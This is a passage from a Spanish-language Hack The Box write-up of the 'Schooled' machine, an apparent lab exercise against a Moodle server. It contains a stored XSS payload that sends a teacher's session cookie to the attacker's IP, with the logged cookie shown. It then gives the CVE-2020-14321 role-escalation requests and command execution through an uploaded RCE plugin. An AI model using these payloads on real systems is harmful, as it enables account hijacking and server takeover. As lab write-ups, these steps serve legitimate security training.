000002576:   &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; L      &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; W        &lt;span class=&#34;m&#34;&gt;84&lt;/span&gt; Ch       &lt;span class=&#34;s2&#34;&gt;&amp;#34;moodle&amp;#34;&lt;/span&gt;

Total time: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
Processed Requests: &lt;span class=&#34;m&#34;&gt;4614&lt;/span&gt;
Filtered Requests: &lt;span class=&#34;m&#34;&gt;4613&lt;/span&gt;
Requests/sec.: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;moodle&#34;&gt;MOODLE&lt;/h1&gt;
&lt;p&gt;Tras agregar el subdominio al archivo &lt;code&gt;/etc/hosts&lt;/code&gt; encontramos la plataforma moodle.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/Screenshot_5.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al intentar registrar un usuario saltó un error en el correo electronico, mostró que solo esta permitido el subdominio: &lt;code&gt;student.schooled.htb&lt;/code&gt;, enumeramos con gobuster este subdominio pero no encontramos nada interesante. Utilizamos el subdominio en el correo electronico para el registro.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/Screenshot_4.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tras el registro ingresamos a la plataforma y encontramos 4 cursos con el nombre de quienes los imparten, solo en el curso de &lt;strong&gt;Mathematics&lt;/strong&gt; tenemos permiso para ingresar, en el curso logramos obtener informacion del profesor &lt;code&gt;Manuel Phillips&lt;/code&gt;, quien tiene el correo &lt;code&gt;phillips_manuel@staff.schooled.htb&lt;/code&gt; y rol de &lt;code&gt;Teacher&lt;/code&gt;. Además vemos una larga lista de estudiantes quienes estan inscritos en este curso.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Manuel Phillips, phillips_manuel@staff.schooled.htb, Teacher
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tambien encontramos dos anuncios, en el primero indica &lt;code&gt;Jamie Borham&lt;/code&gt; la fecha de inicio de clases.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Jamie Borham:

We will commence studies on 7th January 2021. Please be aware that lectures will 
be delivered online on a week by week basis and content will be released on the day of study.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En el segundo anuncio menciona que los estudiantes del curso de &lt;code&gt;Phillips&lt;/code&gt; deben de tener configurado en su perfil la opcion de &lt;a href=&#34;https://moodle.com/es/moodlenet/&#34;&gt;&lt;strong&gt;MoodleNet&lt;/strong&gt;&lt;/a&gt;, y menciona que estará verificando esta configuracion en el perfil de los estudiantes.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Manuel Phillips:

This is a self enrollment course. For students who wish to attend my lectures be sure 
that you have your MoodleNet profile set.
Students who &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; not &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; their MoodleNet profiles will be  removed from the course 
before the course is due to start and I will be checking all students who are enrolled on this course.
Look forward to seeing you all soon.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;phillips-account&#34;&gt;Phillips Account&lt;/h2&gt;
&lt;p&gt;Como sabemos Phillips verifica el campo &lt;code&gt;MoodleNet&lt;/code&gt; en el perfil de los estudiantes inscritos en el curso que imparte, con esto, editamos el campo &lt;code&gt;MoodleNet&lt;/code&gt; con etiquetas HTML y Javascript para verificar si es posible realizar algun tipo de solicitud cuando el perfil sea visitado. Vemos que las etiquetas HTML y codigo Javascript se muestran al visitar nuestro perfil.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/Screenshot_7.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Editamos nuevamente ahora con: &lt;code&gt;&amp;lt;script src=&amp;quot;http://10.10.14.10/a&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;, apuntando hacia un archivo de nuestra maquina, verificando nuevamente que la solicitud se realice, esta vez a nuestra maquina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/Screenshot_6.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Creamos un miniservidor, despues unos minutos logramos obtener una solicitud de dicho archivo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/schooled&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
└─$ ifconfig tun0 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep inet &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo python3 -m http.server &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
        inet 10.10.14.10  netmask 255.255.254.0  destination 10.10.14.10
        inet6 dead:beef:2::1008  prefixlen &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt;  scopeid 0x0&amp;lt;global&amp;gt;
        inet6 fe80::515:84c7:6091:42f6  prefixlen &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt;  scopeid 0x20&amp;lt;link&amp;gt;
Serving HTTP on 0.0.0.0 port &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ...
10.10.14.10 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;07/Apr/2021 05:09:18&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; code 404, message File not found
10.10.14.10 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;07/Apr/2021 05:09:18&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /a HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; -
10.129.95.59 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;07/Apr/2021 05:11:39&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; code 404, message File not found 	&amp;lt;---
10.129.95.59 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;07/Apr/2021 05:11:39&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /a HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; -				&amp;lt;---
10.129.95.59 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;07/Apr/2021 05:11:40&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; code 404, message File not found	&amp;lt;---
10.129.95.59 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;07/Apr/2021 05:11:40&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /a HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; -				&amp;lt;---
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Editamos nuevamente, esta vez con codigo que nos envie el valor de su cookie.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;img src=&amp;#34;http://10.10.14.10/a?cookie=&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cookie&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#34; /&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtuvimos una peticion con el valor de una cookie.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;10.10.14.10 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;07/Apr/2021 05:27:16&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; code 404, message File not found
10.10.14.10 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;07/Apr/2021 05:27:16&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /a?cookie=TinyMCE_toggle=id_description_editor%3D0;%20MoodleSession=d8p8jermnc90vr0vt6ce15v8ka HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; -
10.129.95.59 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;07/Apr/2021 05:28:13&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; code 404, message File not found
10.129.95.59 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;07/Apr/2021 05:28:13&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /a?cookie=MoodleSession=cb7sn364b42d0qe1eercuuickd HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; - 	&amp;lt;---- COOKIE
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Reemplazamos la cookie actual utilizando Firefox (F12), con lo cual logramos acceder a la cuenta de &lt;code&gt;Phillips&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/Screenshot_8.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;moodle---rce&#34;&gt;MOODLE - RCE&lt;/h1&gt;
&lt;p&gt;Al tener acceso a la cuenta de &lt;code&gt;Phillips&lt;/code&gt; tenemos permisos de administrar el curso de Matematicas, al entrar observamos en el footer una direccion externa a la documentacion de Moodle en su &lt;code&gt;version 3.9&lt;/code&gt; por lo que ahora podriamos realizar una busqueda de vulnerabilidades con esta version.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/Screenshot_9.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos un &lt;a href=&#34;https://www.youtube.com/watch?v=BkEInFI4oIU&#34;&gt;video - [#moodle RCE | #CVE-2020-14321 PoC]&lt;/a&gt; el cual utilizamos para escalar privilegios desde una cuenta con el rol &lt;code&gt;Teacher&lt;/code&gt; y poder ejecutar comandos mendiante la instalacion de un &lt;a href=&#34;https://github.com/HoangKien1020/Moodle_RCE&#34;&gt;plugin&lt;/a&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;(CVE-2020-14321)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;manager&#34;&gt;Manager&lt;/h2&gt;
&lt;p&gt;Verificamos el ID de nuestro usuario que registramos en la url visitando nuestro perfil.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;http://moodle.schooled.htb/moodle/user/profile.php?id&lt;span class=&#34;o&#34;&gt;=[&lt;/span&gt;ID&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;podria ser alguno que tenga la extension &lt;code&gt;staff.schooled.htb&lt;/code&gt; tomando en cuenta que uno de estos usuarios tiene el rol de &lt;code&gt;Administrador&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Dentro del curso de Matematicas agregamos un usuario cualquiera, capturamos la solicitud la cual se va a modificar utilizando burpsuite, en la solicitud modificamos las &amp;ldquo;variables&amp;rdquo;: &lt;code&gt;userlist[]=24&lt;/code&gt; y &lt;code&gt;&amp;amp;roletoassign=5&lt;/code&gt;. La primera pertenece al usuario a agregar, en este caso vamos a agregar el nuestro, el Id de Philips y la segunda pertenece al rol (&lt;em&gt;manager&lt;/em&gt;) que se le va a asignar al usuario el cual modificamos a &lt;code&gt;1&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;GET /moodle/enrol/manual/ajax.php?mform_showmore_main&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;enrol&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;enrolid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;sesskey&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;TFFRjCD1t7&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;_qf__enrol_manual_enrol_users_form&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;mform_showmore_id_main&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;userlist%5B%5D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;24&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;roletoassign&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;startdate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;duration&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; HTTP/1.1
Host: moodle.schooled.htb

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras modificar y enviar la solicitud deberiamos de ver en la lista de usuarios del curso nuestro rol como &lt;code&gt;Manager&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;manager--admin&#34;&gt;Manager &amp;gt; Admin&lt;/h2&gt;
&lt;p&gt;Al filtrar los usuarios por la extension del staff dentro del curso, vemos que &lt;code&gt;Lianne Carter&lt;/code&gt; tiene el rol de &lt;code&gt;Manager&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/Screenshot_11.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Verificamos este ultimo usuario y vemos que tiene la opcion &lt;code&gt;Log in as&lt;/code&gt; la cual aprovechamos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/Screenshot_12.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener acceso y vemos que este usuario tiene acceso al area de administracion.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/Screenshot_13.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;plugin--rce&#34;&gt;Plugin &amp;gt; RCE&lt;/h2&gt;
&lt;p&gt;Modificamos la solicitud de &lt;code&gt;Users &amp;gt; Permissions &amp;gt; Define Roles &amp;gt; Manager &amp;gt; Edit &amp;gt; Save Changes&lt;/code&gt; utilizando el &lt;a href=&#34;https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions&#34;&gt;payload&lt;/a&gt; para dar todos los permisos a este usuario y asi tener acceso a la seccion de plugins.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;POST /moodle/admin/roles/define.php?action&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;edit&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;roleid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; HTTP/1.1
Host: moodle.schooled.htb

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ... REDACTED ... &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;sesskey&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;jLH3lQNtzo &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... PAYLOAD ... &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ahora con todos los permisos logramos obtener acceso a la seccion de plugins donde instalamos el &lt;a href=&#34;https://github.com/HoangKien1020/Moodle_RCE&#34;&gt;plugin&lt;/a&gt; para ejecucion de comandos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/Screenshot_14.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora nos dirigimos a la direccion &lt;code&gt;/moodle/blocks/rce/lang/en/block_rce.php?cmd=id&lt;/code&gt; donde logramos ejecutar comandos en la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/schooled/tmp&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
└─$ curl -s &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id;whoami;pwd;uname%20-a&amp;#34;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;80&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;80&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;80&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
www
/usr/local/www/apache24/data/moodle/blocks/rce/lang/en
FreeBSD Schooled 13.0-BETA3 FreeBSD 13.0-BETA3 &lt;span class=&#34;c1&#34;&gt;#0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021     root@releng1.nyi.freebsd.org:/usr/obj/usr/src/amd64.amd64/sys/GENERIC  amd64&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;www---user&#34;&gt;www - User&lt;/h1&gt;
&lt;p&gt;Utilizamos una &lt;a href=&#34;https://sentrywhale.com/documentation/reverse-shell&#34;&gt;shell inversa para FreeBSD&lt;/a&gt; para obtener una shell con el usuario &lt;code&gt;www&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
